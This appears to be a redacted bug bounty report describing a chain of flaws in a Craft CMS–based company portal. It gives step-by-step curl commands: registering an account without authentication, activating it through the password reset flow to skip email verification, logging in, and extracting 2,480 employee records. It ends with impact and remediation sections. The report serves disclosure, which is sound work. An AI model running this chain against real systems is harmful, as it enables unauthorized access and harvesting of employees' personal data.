## Vulnerability details

## Summary

The ████████ portal at `████████` (intended only for authorized Essity employees and partners) has a multi-step vulnerability chain that allows any unauthenticated attacker to:

1. Register an account via the public ████████ API
2. Bypass email verification by exploiting the password reset flow on the pending account
3. Login successfully with an "active" account
4. Access protected API endpoints that leak **2,480 employee records** (names, emails, profile URLs)

This bypasses both the SAML SSO requirement and the email verification gate.

## Attack Chain (Fully Automated PoC)

### Step 1: Register Account (No Auth Required)

```bash
# Get CSRF token from unauthenticated Blitz endpoint
CSRF=$(curl -sk https://████████/actions/blitz/csrf/json)
TOKEN=$(echo "$CSRF" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# Register arbitrary user
curl -sk -X POST '████████' \
  -H 'Accept: application/json' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data-urlencode "CRAFT_CSRF_TOKEN=${TOKEN}" \
  --data-urlencode 'email=████████' \
  --data-urlencode 'password=████████' \
  --data-urlencode 'firstName=Test' \
  --data-urlencode 'lastName=User'
```

**Response:** `{"success":true,"id":████████}`

### Step 2: Request Password Reset for Pending Account

```bash
curl -sk -X POST 'https://████████/actions/users/send-password-reset-email' \
  -H 'Accept: application/json' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data-urlencode "CRAFT_CSRF_TOKEN=${TOKEN}" \
  --data-urlencode 'loginName=████████'
```

**Response:** `{"success":true}`

The reset email is sent even though the account is in "pending verification" state.

### Step 3: Use Reset Code to Activate Account

The reset email contains: `████████`

```bash
curl -sk -X POST 'https://████████/actions/users/set-password' \
  -H 'Accept: application/json' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data-urlencode "CRAFT_CSRF_TOKEN=${TOKEN}" \
  --data-urlencode 'code=████████' \
  --data-urlencode 'id=████████' \
  --data-urlencode 'newPassword=████████' \
  --data-urlencode 'confirmPassword=████████'
```

**Response:** `{"success":true,"status":"active"}`

The account status changes from "pending" to **"active"**, completely bypassing email verification.

### Step 4: Login

```bash
curl -sk -X POST 'https://████████/actions/users/login' \
  -H 'Accept: application/json' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data-urlencode "CRAFT_CSRF_TOKEN=${TOKEN}" \
  --data-urlencode 'loginName=████████' \
  --data-urlencode 'password=████████'
```

**Response:** `{"success":true,"returnUrl":"https://████████/"}`

### Step 5: Access PII Data

```bash
curl -sk -b <session_cookie> 'https://████████/api/people-finder.json'
```

**Response:** 562KB JSON with **2,480 employee records** containing:
- Employee IDs
- Full names
- Email addresses ████████
- Profile page URLs
- Job titles (where populated)

See ████████ people_finder_full_extract.json

## Impact

## Impact

| Impact | Description |
|--------|-------------|
| **PII Data Breach** | 2,480 employee records exposed (names, corporate emails, profile URLs) |
| **Access Control Bypass** | SAML SSO requirement completely bypassed via direct API registration |
| **Email Verification Bypass** | Password reset flow activates accounts without email confirmation |
| **Spear Phishing Enabler** | Leaked employee directory enables targeted social engineering |
| **Brand Asset Exposure** | Authenticated access to collections management (████████ guidelines, assets) |

## Remediation

1. **Disable public user registration** or restrict to allowlisted email domains ████████
2. **Do not send password reset emails to unverified accounts** (Craft CMS should check `pending` status before sending)
3. **Enforce admin-approval gate on ALL authenticated endpoints**, not just the portal views. The `/api/people-finder.json` endpoint must check group permissions.
4. **Remove Blitz CSRF endpoint** from public access or add rate limiting
5. **Add CAPTCHA** to registration and password reset flows
6. **Audit all API endpoints** for missing authorization checks on non-approved users
